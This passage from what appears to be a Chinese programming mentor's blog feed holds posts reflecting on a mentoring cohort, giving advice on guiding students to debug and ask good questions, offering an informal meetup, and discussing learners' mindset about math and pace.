id="JavaScript-想講得太多"><a href="#JavaScript-想講得太多" class="headerlink" title="JavaScript 想講得太多"></a>JavaScript 想講得太多</h4><p>在 JavaScript 的教學上我犯了一個錯誤，就是我想講的東西太多了，所以就會把課程塞很滿。因為我很喜歡補充一些東西，但程式這塊又有太多可以補充，就會變成說我教 A 之後補充 B 然後 C、D…但可能對初學者來說，只有 A 是最重要的，其他的之後在學也不遲。</p><p>簡單來說呢，就是我想講得太多，雖然說課程看似很滿很豐富，但對於初學者來說反而沒那麼容易學習，因為他們不知道哪裡是重點。而且一旦把課程塞太多東西，就會沒辦法講得比較慢比較仔細，很多東西可能都稍微提一下但是沒有仔細講解，對學習來說是沒有什麼幫助的。</p><h4 id="API-的部分還是沒有銜接得很好"><a href="#API-的部分還是沒有銜接得很好" class="headerlink" title="API 的部分還是沒有銜接得很好"></a>API 的部分還是沒有銜接得很好</h4><p>在文中我有提過，第二期的第四週是用 JavaScript 串接 API，然後哀鴻遍野，於是我在第三期第四週改成網路相關的課程，並且用 Node.js 串接簡易 API。</p><p>我覺得想法跟方向是對的，只是細節處理得不夠好。</p><p>根據學生們的反映，他們還是沒有很清楚 API 到底是什麼，也不太知道該怎麼串接 API。雖然我在課程裡面有示範，但我猜應該還不夠詳細，這邊應該要再花多一點篇幅去解釋。</p><p>而且在課程裡面有稍微提到的 process.argv 我也只是簡單帶過，沒想到之後滿多學生卡在這個地方，應該要再詳細講解一下才對。</p><p>在前五週的部分，目前我有察覺到之後可以改善的點差不多就是這樣。</p><h3 id="課程相關數據"><a href="#課程相關數據" class="headerlink" title="課程相關數據"></a>課程相關數據</h3><p>前幾天課程進行到第六週結尾的時候我有跟學生們分享了一些數據，在這邊也可以跟大家分享一下：</p><blockquote><p>計畫剛開始是收 63 人但有一個人沒回應，所以學生數其實是 62 人。第四週時淘汰 3 人，第六週時淘汰 1 人，目前剩下 58 人。</p></blockquote><blockquote><p>目前的進度分佈：</p></blockquote><blockquote><p>第二週 7%<br>第三週 7%<br>第四週 15%<br>第五週 17%<br>第六週 40%<br>超前進度 14%</p></blockquote><blockquote><p>可以看出來大概一半的人跟上進度，另一半沒有。原因可能有很多，有可能是我的問題（課程沒設計好）也有可能是你的（沒有付出一定時間）。不過這邊歸咎問題其實也沒什麼幫助，反正進度是自己的，只要能好好學習下去，落後一點也沒什麼關係。</p></blockquote><blockquote><p>今天是計畫的第 42 天，所以大家已經開始學程式一個半月左右了。雖然說系統的字數統計其實不太精準（因為特殊符號跟程式碼都會被列入），但還是稍微跟大家講一下。</p></blockquote><blockquote><p>大家一共寫了 63 萬字的進度報告，其中有五位同學寫了超過兩萬字，最多的甚至還寫到五萬字，實在是很會寫。</p></blockquote><blockquote><p>但沒有寫到這麼多的也不用緊張，畢竟進度報告就只是個報告，你想寫多還是寫少都可以，本來就沒有規定字數要多少。像我遊記也是有靈感的時候就多一點，反之則少一點，不用對字數這種東西有壓力。</p></blockquote><h3 id="整體心得"><a href="#整體心得" class="headerlink" title="整體心得"></a>整體心得</h3><p>我記得在計畫開始後的隔天，我打開學習系統，看到每一個人第一天的學習心得，說實在的心裡滿感動的。我也不知道怎麼形容，就是有種：「哇，大家都在這」的感覺，也很感謝兩個月前的自己願意突破拖延症，完成這個學習系統。</p><p>我覺得做這種教學相關的優化跟做程式上的優化有個最大的差異。後者可能是效能提升 30%、頁面載入速度加快 25% 等等，是一些你能夠量化的數字，你也可以實際感受到。不過，它就是個數字而已。</p><p>但是做程式教學，你的對象是人，是一個活生生的人。所以你可以看到他從一開始什麼都不會，到了第五週會寫一點 JavaScript、會用 Git，會用 Command line 指令去完成一些基本的操作。這種進步是比數字上的成長還要更「活」的。</p><p>不過從另一個角度想，其實也背負著一定的壓力。如果今天不是變快而是變慢呢？如果你的教學其實是在拖累一個人的成長呢？這就又是另外一回事了。</p><p>第三期的計畫跑到目前為止，如果要讓我幫自己打個分數，可能會落在 75<del>80 這個區間。換算成等地制可能是 B+</del>A- 吧。大多數的事情我都覺得做得不錯，但是還是有滿多空間可以優化，而有些事情我也確實不是處理得很好。</p><p>不過自評其實也沒什麼參考價值，應該要學生來評價我才比較客觀一點 😂<br>（如果你想看全部學生前五週的心得，可以<a href="https://github.com/Lidemy/homeworks-3rd/issues?page=1&q=is:closed+label:Week5">看這裡</a>，或是其中一篇：<a href="https://yakimhsu.com/project/project_w5_review.html">[第五週] 參加「 程式導師實驗計畫第三期 」的滿月心得</a>）</p><p>總之呢，每一期變動最大的幾乎都是前幾週，因為我每次都發現學習曲線還不夠平緩，所以會一再地去調整。經歷了前兩期的洗禮之後，我覺得第三期的學習曲線到目前為止還算 ok，當然不能說是完全對新手 friendly，但我覺得也沒有很不 friendly（像第一期那樣）。</p><p>只要能把我上面提的那兩個缺點再改善一下，我覺得前五週的課綱設計應該短期內就不會再變動了，大概是我至今能想到最好的課程安排。</p><p>還有一點我突然想到，因為這一期大部分時間我人都會在國外旅遊，所以必須帶個筆電然後改作業。這對我來說其實是優點，因為我不是個很愛往外面跑的人，儘管是出國旅遊也一樣。像我現在就是坐在淺草附近的 hostel 裡面打著這篇文章，等著待會下午兩點去看看炸牛排是不是還在排隊。</p><p>所以改作業這件事反而讓我的旅程增添了幾分趣味，至少當我待在房間裡面不想出門時不會感到無聊，因為永遠都會有新的作業讓我改，或者是想一下要寫文章的題材之類的。</p><p>目前課程大概進行了 20%，我覺得還算是順利，以往的課程心得文都是課程進行到一半或者是結束才有，這一篇是剛好有些東西想分享，所以才會在這麼早期的時間點就 po 心得文，下一次再跟大家分享時應該課已經上到一半之類的了。</p><p>大概就是這樣，那我們下次見啦！</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何幫助學生解決程式問題？我認為的好方法跟壞方法</title>
      <link href="/2019/05/10/how-to-answer-question-eef8802126b3/"/>
      <url>/2019/05/10/how-to-answer-question-eef8802126b3/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/how-to-answer-question-eef8802126b3/0__40uNERe3eBaqyIFH.jpg"></p><p><a href="/2019/03/14/mentor-program-3rd-47a2e85e33b3/">程式導師實驗計畫第三期</a>開始快一個月了。有了前兩期的累積，第三期到目前為止執行得滿順利的，我也嘗試了很多想嘗試的新東西，這部分之後可以再寫一篇文章跟大家分享。</p><p>有滿多文章都在談「如何問一個好問題」，例如說最經典的：<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way">提問的智慧</a>。但好像比較少文章在談：「如何給出一個好答案」。</p><p>或是更精確地說，如果你是要站在一個導師的角度去回答學生問題，我覺得「給出一個好答案」並不是最好的方法，「引導學生自己找到答案」才是正確解答。不過依據學生提問的種類不同，其實也會有不同的回答方法。</p><p>接下來我會談談我自己在回答學生的問題時會盡量遵守的一些準則，並且說說我認為哪些是好的，哪些又是不好的。如果你有哪些部份想討論的，都歡迎在底下留言。</p><h3 id="壞方法：直接告訴學生答案"><a href="#壞方法：直接告訴學生答案" class="headerlink" title="壞方法：直接告訴學生答案"></a>壞方法：直接告訴學生答案</h3><p>在《<a href="https://www.books.com.tw/products/0010807825">學生為什麼不喜歡上學？</a>》這本書中，有一段是這麼說的：</p><blockquote><p>回到教學上，我是這麼想的：我要學生學習的內容，說白了就是一個問題的答案。答案本身一點都不有趣，但如果你知道問題的話，答案可能會很有意思。所以把問題說清楚才那麼重要。</p></blockquote><blockquote><p>但我有時候覺得，身為教師，我們都太強調求出答案，而沒有花足夠的時間讓學生理解問題，並了解問題的重要性。</p></blockquote><p>答案一點都不有趣，有趣的是去尋找答案的那個過程。我覺得有時候若是直接給了答案，反而就像看電影爆雷那樣，一切就都不再有趣了。</p><p>但在有些情形之下，直接給答案還是可以的。我開頭有說了，依照問題的不同也會有不同的應對方式，我先提出一個原則好了：</p><blockquote><p>在回答學生問題的時候，讓他「知道答案」不是最重要的。讓他「知道怎麼找到答案」才是。因為唯有這樣，下一次他才能自己解決問題。</p></blockquote><p>這邊我直接舉一個常見的例子。</p><p>在要學生寫出判斷質數的程式碼時，有個很常見的錯誤會長這樣：</p><p>發生錯誤之後，學生可能會帶著這段 code 來找你，問你說：「老師，為什麼這題輸出的結果跟我想的不一樣？」或是「老師，為什麼這樣解不行？」</p><p>這時候我認為比較不好的答案是：「因為你的程式碼跟你的邏輯不一樣，你那個 return true 應該要放 for 外面才對」</p><p>若是回答這個，學生看了之後可能會有兩種反應：</p><ol><li>先改程式碼，改了之後發現正確就不管它</li><li>想了一下發現老師說得對，把程式碼改掉之後變正確了</li></ol><h3 id="好方法：不要輕易告訴學生解答，而是引導"><a href="#好方法：不要輕易告訴學生解答，而是引導" class="headerlink" title="好方法：不要輕易告訴學生解答，而是引導"></a>好方法：不要輕易告訴學生解答，而是引導</h3><p>那我認為比較好的回答是什麼？比較好的回答是引導他，讓他自己發現問題在哪裡。</p><p>具體上該怎麼做呢？</p><p>我會跟他說：「你丟 9 這個數字進去，然後<strong>一行一行</strong>跟我說程式碼是怎麼跑的」。</p><p>老手跟新手有一個很大的差別。</p><p>我看到程式碼以後，我就可以假裝我是電腦一行一行執行，但新手不行。新手看程式碼是憑感覺的；憑感覺應該會這樣跑，但現實往往事與願違。所以要幫助新手，就要幫他培養這種程式思維。</p><p>學生一行一行把執行順序寫下來後，會變成這樣：</p><ol><li>執行 isPrime(9)</li><li>判斷 n 是否等於 1，不是，往下執行</li><li>執行 for 迴圈，設定 i &#x3D; 2，符合 2 &lt; 9，繼續執行</li><li>跑到迴圈裡面，判斷9 % 2，不等於 0，回傳 true</li></ol><p>這時候就能發現程式的邏輯錯在哪裡了。正確的邏輯應該是：「2 ~ n-1 的正整數都無法整除，才是質數」，但現在變成：「只要沒辦法被 2 整除，就是質數」。</p><p>意識到這點之後，學生就自然能夠修正錯誤了。</p><p>我的原則是：「你沒有自己理解過這段程式碼，別叫我幫你 debug」，因為幫你 debug 也沒有用。你需要的不是我幫你 debug，而是學會自己怎麼 debug。</p><p>所以好方法跟壞方法的差別在哪裡？差別在於解法是誰想出來的。你自己想出來的解法跟別人想出來然後告訴你，你覺得哪一個印象會更深刻？</p><h3 id="壞方法：剝奪學生學習-Google-的機會"><a href="#壞方法：剝奪學生學習-Google-的機會" class="headerlink" title="壞方法：剝奪學生學習 Google 的機會"></a>壞方法：剝奪學生學習 Google 的機會</h3><p>以下是真實案例，一個學生曾經問過我的問題：</p><blockquote><p>請問一下 Google 表單點選輸入框後，那個底線的特效怎麼弄的 ? 搞了一下午弄不出來，但又覺得這特效很不錯</p></blockquote><p>此時你可能會做出幾個選擇：</p><ol><li>直接跟他說可能是 transition 搭配 padding 或是 width 之類的</li><li>把 demo 寫好直接丟給他</li><li>丟 material UI 的 source code 給他</li><li>自己也不知道，於是丟 Google 之後貼第一個搜尋結果的網址給他</li></ol><p>但無論是哪一種，一樣都是直接讓他知道結果。下次再碰到問題時，他一樣會跑來問你，因為他不知道該怎麼找答案。</p><h3 id="好方法：讓他學習你的-Google-關鍵字"><a href="#好方法：讓他學習你的-Google-關鍵字" class="headerlink" title="好方法：讓他學習你的 Google 關鍵字"></a>好方法：讓他學習你的 Google 關鍵字</h3><p>很多新手不是不會用 Google，他們當然也知道問問題以前要先 Google。但問題是，關鍵字要怎麼下？對新手來說這個領域是完全陌生的，甚至連專有名詞都還沒瞭解過，你要他們怎麼下關鍵字？</p><p>所以我認為的好方法就是：把你針對這問題會下的關鍵字給他。</p><p>以這題來說，我會下的是：「underline transition css google form」，我自己試過之後發現前幾筆資料看起來是 ok 的，就會把這個關鍵字丟給學生。</p><p>壞方法跟好方法的差別在哪裡？</p><p>差別在一個是學習你的解答，一個是學習你解決問題的方法。</p><h3 id="壞方法：容忍壞問題，盡情發揮通靈本領"><a href="#壞方法：容忍壞問題，盡情發揮通靈本領" class="headerlink" title="壞方法：容忍壞問題，盡情發揮通靈本領"></a>壞方法：容忍壞問題，盡情發揮通靈本領</h3><p>雖然說大家都看過提問的智慧，但很多新手提出來的問題都還是很沒有智慧。沒有啦開個玩笑，這樣講有點太嚴重。我的意思是，他們提出來的問題依然沒有那麼好，沒有附上所有你需要的 debug 資訊。</p><p>例如說這個問題：</p><blockquote><p>請問: curl: (60) SSL certificate problem: unable to get local issuer certificate 要怎麼解決？</p></blockquote><p>你可以直接拿錯誤訊息去 Google 然後把解法丟給他，但這並沒有解決問題。因為他的問題還有一個，那就是：「不知道怎麼正確地提問」。</p><p>還有一個例子：</p><blockquote><p>請問有人用 Eslint 遇到 2:29 error Parsing error: Unexpected token )嗎？我 google 後有人說這句指程式碼是正確的，但轉寫格式有錯就會出現類似問題，不太懂這句的意思</p></blockquote><p>有 Google 過，很好。但光憑這個錯誤訊息，我是沒辦法 debug 的。我必須知道你第 2 行到底放了什麼程式碼，才知道問題出在哪，才能幫你忙。</p><p>當然，很多有經驗的工程師都已經培養了通靈的技能，而且級別還滿高的。有時候對於這種壞問題，還是可以發揮通靈王的本事，直接猜中他原本的程式碼可能長什麼樣子，然後就把問題給解決了。</p><p>但這是治標而不是治本。</p><h3 id="好方法：壞問題請改成好問題，而不是靠通靈"><a href="#好方法：壞問題請改成好問題，而不是靠通靈" class="headerlink" title="好方法：壞問題請改成好問題，而不是靠通靈"></a>好方法：壞問題請改成好問題，而不是靠通靈</h3><p>除了學生問的那個問題以外，最大的問題其實是<strong>學生不知道怎麼問出好問題</strong>。培養問問題的能力也是很重要的，有時候你一旦學會提問，在把問題整理好的時候可能就已經知道如何找到解答了。</p><p>針對第一個提問，我會問他說：「你嘗試過哪些解法了？」、「你下了哪些指令？」、「可以給我看 terminal 的截圖嗎？」。一個好問題，能夠讓別人看到問題以後直接幫你 debug，因為你把該給的資訊都給了。</p><p>所以這個問題如果是我來問，會變成這樣：</p><blockquote><p>我在下指令：curl <a href="https://google.com/">https://google.com</a> 的時候碰到錯誤：curl: (60) SSL certificate problem: unable to get local issuer certificate，這是 terminal 的截圖（附上圖片）。我拿錯誤訊息去 Google 之後找到了這篇文章（附上連結），照著上面寫的加上一個參數 xxx 之後還是一樣，想問一下有其他解法嗎？</p></blockquote><p>針對第二個提問，我會問他說：「你是不是少附了什麼？」，對方就應該會把程式碼也給貼上來。除了這些，其實也應該要把 terminal 截圖給貼上來，看一下 ESLint 錯誤發生時的截圖，才有足夠的資訊可以來 debug。</p><p>這邊一樣給完整範例，是我的話會這樣問：</p><blockquote><p>我剛剛在跑 ESLint 的時候出現了這個錯誤： 2:29 error Parsing error: Unexpected token )，這邊是我的程式碼（附上文字），這邊是編輯器的截圖（這樣比較好看行號），這是 terminal 的截圖（可以看 ESLint 的錯誤訊息），我拿這錯誤去 Google 之後好像都是不太相干的文章，不太知道錯在哪裡，想問一下有人有任何方向嗎？</p></blockquote><p>問問題的時候請把握幾個原則：</p><ol><li>錯誤發生在哪？（文字加截圖）</li><li>錯誤內容為何？（文字加截圖）</li><li>你怎麼下關鍵字？（搞不好只是關鍵字沒下好）</li><li>你試過哪些解法？（可以給連結）</li><li>你猜測可能是哪邊有問題？（雖然不一定準就是了）</li></ol><p>要準備完整一定會比較麻煩，但這是必要的。而且如同我上面所說的，很多時候你把問題準備好之後，就會發現自己已經知道怎麼解開了。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>回答問題時，其實就是一個原則：</p><blockquote><p>讓學生學習你解決問題的方法，而不是學習你的成果。</p></blockquote><p>你怎麼 debug，你就教學生怎麼 debug，而不是幫學生把 bug 修好之後跟他說：「欸欸，是這個問題」。</p><p>引導式的教學方法會比較花時間，而且有時候你會覺得有點繞遠路（明明就知道錯在哪裡卻不能直接跟他說），但我覺得長期來看，這才是比較有效率的方法。</p><p>以上是目前我自己在教學時會盡量採用的方法，也順便幫自己記錄起來。搞不好過個一兩年我會發現其實有更好的方法，或甚至當初覺得的壞方法其實是好方法之類的。</p><p>有什麼跟教學相關的心得也歡迎留言跟我討論，感謝。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>期間限定企劃：請我吃飯</title>
      <link href="/2019/04/19/buy-me-a-meal-6e314b5d5bcb/"/>
      <url>/2019/04/19/buy-me-a-meal-6e314b5d5bcb/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/buy-me-a-meal-6e314b5d5bcb/0__hk1h8xe53T4xpyQF.jpg"></p><h4 id="2019–04–23-更新"><a href="#2019–04–23-更新" class="headerlink" title="2019–04–23 更新"></a>2019–04–23 更新</h4><p>大概收到三十幾份回覆，比我預期中的多太多了… 之後沒約成的我也會回信稍微講一下狀況，總之表單我先收起來了。</p><p>這是我有一天在走路的時候突然想到的企劃。</p><p>事情是這樣子的，相信大家應該都有過一些經歷，像是在網路上看到一些人發表的文章，覺得想要跟他聊聊看，應該會很有趣，或者是有問題想要請教對方。</p><p>接著可能就會鼓起勇氣傳訊息給他，約出來喝個咖啡或者是吃個午餐之類的。</p><p>我之前有說過我寫文章的初衷之一是：幫助以前的自己。因為我希望我在剛出社會時可以看到更多真實的職涯紀錄，所以我寫了<a href="/2019/04/13/4-years-review-7fb7edc52687/?source=friends_link&sk=8a0099e4e8a8245f93ed140444669cd2">成為前端工程師的四週年回顧</a>；因為我希望自己少走一些冤枉路，所以寫了一些技術科普文。</p><p>當我自己察覺到「為什麼沒人來做這件事？」或是「好希望有人能這樣做」的時候，就會跳下來自己先做這件事。如果我只是抱持著這些期望卻留在原地，那可能就永遠都這樣了。</p><p>但如果我做了這件事，可能也會有些人被我影響到，至少下一個這樣想的人就會知道說：「喔～huli 之前做過這件事」。</p><p>其實上面講的約出來喝個咖啡或是吃個午餐這件事，本來就有些人會寫在自介或者是文章最底下，但我這篇要直接跟大家說：</p><blockquote><p>安安，想跟我聊聊的話可以直接請我吃飯</p></blockquote><p>所以這企劃很簡單，就是如果有人想請我吃個飯認識一下，都可以填這個表單：（已截止）。</p><p>但因為我之後要出國，所以限定時間是下週一（2019–04–22）到五月初（2019–05–03），之後這活動就結束了。</p><p>你想聊什麼都可以，想直接把我當作什麼技術顧問，問一堆技術問題也行，或者想問怎麼轉職、怎麼寫廢文、怎麼教學、怎麼去新加坡…都可以，你想聊其他的像是「上一秒的我跟這一秒的我是同一個我嗎」、「你對女性主義的看法為何？」、「黑鏡好看嗎？」、「最近教學進行得怎麼樣」、「冰鳥為什麼還敢下來」都可以，所以真的就是聊什麼都行。</p><p>時間你選、地點你選（但限定在台北市），人數也不限定 1 人（但 1 個人為佳），但最多 3 人，超過這人數我覺得很難聊，可是如果你有什麼特殊理由要超過 3 人的話，可以在表單裡面註明。</p><p>我這個人很 free，所以聊天途中你如果發現氣氛很尷尬聊不太起來，要臨時喊卡中途走掉什麼的都可以，我也都不介意。</p><p>不過也不是每個填表單的都可以成團，如果我那一陣子太忙、你約的時間我沒空、你想聊的東西我很沒興趣或者是其他不可抗力之因素，都有可能造成流團。</p><p>總之填了表單之後如果我覺得 ok 我會跟你聯絡，所以請確保 email 有填對，然後做個 final check，若是填了以後沒有下文那應該就是流團了。</p><p>表單在這，歡迎大家請我吃飯：（已截止）。</p><h3 id="常見問題"><a href="#常見問題" class="headerlink" title="常見問題"></a>常見問題</h3><h4 id="Q：-為什麼要辦這個活動？"><a href="#Q：-為什麼要辦這個活動？" class="headerlink" title="Q： 為什麼要辦這個活動？"></a>Q： 為什麼要辦這個活動？</h4><p>因為我覺得很有趣。</p><h4 id="Q：為什麼要別人請你而不是各付各的？"><a href="#Q：為什麼要別人請你而不是各付各的？" class="headerlink" title="Q：為什麼要別人請你而不是各付各的？"></a>Q：為什麼要別人請你而不是各付各的？</h4><p>通常想認識人不是都會說「我請你喝杯咖啡」之類的，但我不怎麼喝咖啡，所以就變成請吃飯了。如果大家有緣聊得來變好朋友的話，下一餐我請是絕對沒問題的，禮尚往來。</p><h4 id="Q：為什麼我要請你吃飯？"><a href="#Q：為什麼我要請你吃飯？" class="headerlink" title="Q：為什麼我要請你吃飯？"></a>Q：為什麼我要請你吃飯？</h4><p>我也不知道，這就要問你自己了。如果找不到理由或是覺得這個活動很莫名其妙，那也可以不要請我吃飯。</p><h4 id="Q：請你吃什麼都可以嗎？"><a href="#Q：請你吃什麼都可以嗎？" class="headerlink" title="Q：請你吃什麼都可以嗎？"></a>Q：請你吃什麼都可以嗎？</h4><p>都可以，我對東西好不好吃其實沒那麼在意，比較希望找到一個適合聊天的地方。像是速食店什麼的可能就太吵，但如果有人少的速食店的話那當然也可以。</p><h4 id="Q：你是誰？"><a href="#Q：你是誰？" class="headerlink" title="Q：你是誰？"></a>Q：你是誰？</h4><p>可參考我以前寫過的 Medium 文章。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>學程式的第零課：心態調整</title>
      <link href="/2019/04/14/before-learning-b9b933b6078e/"/>
      <url>/2019/04/14/before-learning-b9b933b6078e/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/before-learning-b9b933b6078e/0__ruOViG4Z0Eb8AinG.jpg"></p><p>因為開設了<a href="/2019/03/14/mentor-program-3rd-47a2e85e33b3/">程式導師實驗計畫</a>的緣故，收了不少學生，也收了不少報名信。在看過一些案例之後，深深覺得在開始學程式以前，有一件很重要的事情要先處理，那就是心態上的調整。</p><p>可能是因為以前受過的教育與學習上的挫折，或甚至是碰到不適合的老師與教材，有些學生對學習程式有種恐懼感。就算沒有恐懼感，在真正開始學程式以後又會碰到一大堆的問題，而且許多是心理上的問題，這些或多或少都會影響到學生。</p><p>而這篇原本是想放在我自己的教材裡面，在計畫開始之前給學生看，但想一想之後覺得直接寫出來放在 Medium 也可以。因為適用對象不只有參與計劃的學生們，我相信其他人應該也有這些困擾。</p><p>總之呢，這篇文希望能幫助大家在學程式以前做一些心態上的調整，往後學起程式時能夠拋下一些不必要的包袱。</p><h3 id="數學不好怎麼辦？是不是程式也學不好？"><a href="#數學不好怎麼辦？是不是程式也學不好？" class="headerlink" title="數學不好怎麼辦？是不是程式也學不好？"></a>數學不好怎麼辦？是不是程式也學不好？</h3><p>這其實是一個滿常被討論的議題，數學跟學程式到底有沒有關聯？與其類似的還有一個問題：資料結構跟演算法到底重不重要？</p><p>我覺得在討論這個議題時，一個常見的錯誤就是把這個問題看得「太簡單」，想要用單一標準就來解決這個問題。但問題就在於當你指涉到「數學」這個詞的時候，背後其實涵蓋了幾個不同的概念。</p><p>數學指的是什麼？</p><p>是數學的計算能力嗎？我計算 28*72 算得慢的話，是否代表程式就學不好？</p><p>是數學的知識嗎？我不知道什麼是 log，不知道排列組合的 P 跟 C 是什麼，是否代表程式就學不好？</p><p>是數學背後的思考方式嗎？我沒辦法掌握學數學時背後的那套解題方法跟思維邏輯，是否代表程式就學不好？</p><p>而且同樣地，當我們說到「是否程式就學不好」時，那個「程式」指的又是什麼？</p><p>是指說判斷式、宣告變數、迴圈這些語法嗎？還是當我看到一個題目時我能不能解出來？又或者是指說我能不能寫出一個簡單的 <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a> 程式？</p><p>數學這一個詞背後代表的是不同的能力的總和，所以牽涉到的範圍很廣，有些與程式相關，有些與程式不相關。而程式這個詞背後也很廣，根據指涉到的對象不同，也會有不同的答案。</p><p>我認為學數學時的背後的那套思考方式是跟學程式時有關的，事實上，你在學程式時應該要學的也是背後那套思考方式，詳情可參考這篇文章：<a href="/2018/10/29/learn-coding-9c572c2fb2/">當我們在學程式時，要學的到底是什麼？</a></p><p>在學數學的時候，我（還有跟我一樣的很多人）其實沒有意識到我們真正該培養的是背後這個能力，例如說抽象化。我們把一個現實生活中的問題，例如說一個代數問題好了，轉化成數學上的符號，當我們利用數學解開以後，實際的問題也就解開了。</p><p>而在解題的時候也或多或少利用了一些技巧，例如說把問題縮小，當你解開子問題時，原本的問題也就解開了。或者是把問題轉化，由 A 轉化成 B，把包裝過的問題拆開，變成一個容易許多的相似問題。</p><p>這些能力都跟你在寫程式的時候是很類似的，只是你以前沒意識到你在學習這些東西而已（連我自己都沒有）。</p><p>這邊推薦一篇很不錯的文章：<a href="https://ithelp.ithome.com.tw/articles/10201905">[心得]一個語言如果不改變你的思考方式，就不值得學？談程式語言的本質</a>，裡面有提到了相似的概念，讓你從另一個角度來看學程式這件事。還有一篇跟演算法與資料結構相關的：<a href="https://medium.com/@yenru/%E6%83%B3%E8%A6%81%E5%B0%88%E7%B2%BE%E7%A8%8B%E5%BC%8F%E5%BF%85%E9%A0%88%E5%AD%B8%E6%9C%83%E4%BB%80%E9%BA%BC-9d273b940d43">想要專精程式必須學會什麼？</a>，本文跟底下我的回覆都可以看看。</p><p>好，不小心拉得有點遠，但我覺得這些都能夠讓你重新再思考一次數學與程式的關聯，能夠把問題再定義地更明確一點。</p><p>回到原問題：數學不好，程式也學不好嗎？</p><p>這邊我想以兩個方向回答，第一個方向是刻板印象如何影響到學習。</p><p>通常會問這問題的人數學都不好，若是你又打從心底認同數學不好，程式一定也學不好的話，你在學程式時就已經有個心魔籠罩著。如果認為自己一定學不好，那學習的表現自然就會差。</p><p>這可不是我在唬爛，是有科學根據的，那就是刻板印象會影響到學習的表現。最常見的範例之一就是女生與數學的關係。推薦你們一定要去看看這篇文章：<a href="http://www.liberalstudies.hk/blog/ls_blog.php?id=3280&mother_id=1701">刻板印象威脅：優秀女生數學失準之謎</a>，我直接引其中一小段：</p><blockquote><p>提出人格特質理論的心理學家 Gordon Allport 認為，對一個人的評價，不論是真假，只要一而再、再而三地灌輸到此人腦中，就一定會對他的性格形成影響。兒童在四至六歲開始形成自我形象，會根據別人的評語評量自己，形成對自己的印象。</p></blockquote><blockquote><p>如果社會上對某個身分有刻板印象，這種印象會逐漸內化成其特質的一部分。假如小女孩自小就聽說「女性數學能力較差」這個刻板印象，即使她本來數學能力沒有問題，但她上數學堂時可能會因此而較自卑、遇到難題會自我懷疑、對數學的期望亦會調低，最終自己的數學表現一般就會印證刻板印象，形成惡性循環。</p></blockquote><p>或許女生在生理上先天數學能力就較差，或許沒有。或許數學跟程式就是有著超級正相關，數學爛程式就學的爛，也或許沒有。</p><p>但真正的問題是，你都還沒開始學，想這麼多幹嘛？在你已經知道刻板印象會影響學習之後，最好的方法就是擺脫這些刻板印象去學習。</p><p>先學就對了，不要畫地自限。</p><p>如果你學得很不錯，那當然很好；如果你學不好，也不必硬是要找個「戰犯」把罪名套在它頭上：「對嘛，就是因為我數學不好，程式才學不好」，這樣子對學習也沒什麼幫助。</p><p>對我來說，學程式就是學程式，需要的數學知識你在小學跟國中的時候都學過了。如果你程式學不好，就多花點精力跟時間在程式上，不斷鍛鍊背後的那套思考邏輯。假如真的你花超多時間跟精力卻還是學不好程式，到時候我們再來探討原因，也許有可能真的跟數學能力或是其他東西有關。</p><p>但是你還沒學程式，而且還沒跟我學，談論這些都還太早。有時候學不好不是能力問題，是心理問題，如果打從心底就相信自己學不好，那怎麼會學得好？</p><p>我也沒有要你覺得「我一定能學會寫程式」，我只希望你先拋開那些既定印象跟各種「聽別人說」以及「我覺得」，先專注在學程式這件事情上。</p><p>沒有包袱、沒有預設立場，以這種心態開始去學程式，若是三個月後還是學不會，我們再來討論數學跟程式的關聯。</p><h3 id="進度跟不上怎麼辦？是不是自己太弱？"><a href="#進度跟不上怎麼辦？是不是自己太弱？" class="headerlink" title="進度跟不上怎麼辦？是不是自己太弱？"></a>進度跟不上怎麼辦？是不是自己太弱？</h3><p>「比較」一直一來都是個雙面刃。</p><p>當你意識到自己比同期的人進度快上許多，優越感油然而生，「哇靠我怎麼那麼強，根本天選之人，大概出生就是有這種寫程式的天份吧」；可是相反過來時，就會開始懷疑自我：「為什麼他可以這麼快完成這個作業？而我卻花了一個禮拜都寫不出來？應該是我太弱了吧，一定是因為我數學不好…（連結到上一題）」。</p><p>要對付這個問題，你要先認清事實。</p><p>事實就是學習的進度本來就是相對的，本來就是每個人都不一樣的。有人快也有人慢，這個再正常不過，只是你在這個群體裡面剛好是慢的那個。在 NBA 默默無名的球員，在 SBL 可能是隊上的王牌，因為強度跟環境不一樣，所以實力是比較出來的。</p><p>所以這也是為什麼我一直跟大家說：</p><blockquote><p>跟著自己的進度走。</p></blockquote><p>無論進度在前面還是後面，背後都有太多你看不見的東西。或許他五年前學過程式，還差點成了工程師；或許他每天都寫 code 到半夜兩點，甚至連白天的上班時間都在偷偷寫作業；或許他程式基礎很好，只是最近在忙其他事情所以進度落後，但說不準哪天急起直追，又回到領先的行列。</p><p>與其跟別人比較，有其他更有意義的事情可以做，例如說…<strong>好好看著自己</strong>，想想自己這陣子學了什麼，跟兩週前比起來進步了多少；或者是從其他人身上看見自己的不足並且加以彌補。</p><p>「比較」不是為了讓自己信心破滅用的，這對學習一點幫助都沒有。如果你真的很想比較，重要的是比較之後發現自己的缺點然後加以改正。無論進度比你快還是比你慢，都有可以從他們身上學到的東西，至少我是這麼想的。</p><p>最後附上一個來源已經不可考的詩：每個人都有自己的時區（<a href="https://www.ettoday.net/dalemon/post/27120">翻譯來源</a>）。</p><blockquote><p>紐約時間比加州時間早三個小時，但加州時間並沒有變慢。<br>有人 22 歲就畢業了，但等了五年才找到一個好工作！<br>有人 25 歲就當上 CEO，卻在 50 歲去世。<br>也有人直到 50 歲才當上 CEO，然後活到 90 歲。<br>有人依舊單身，同時也有人結婚。<br>歐巴馬 55 歲就退休，川普 70 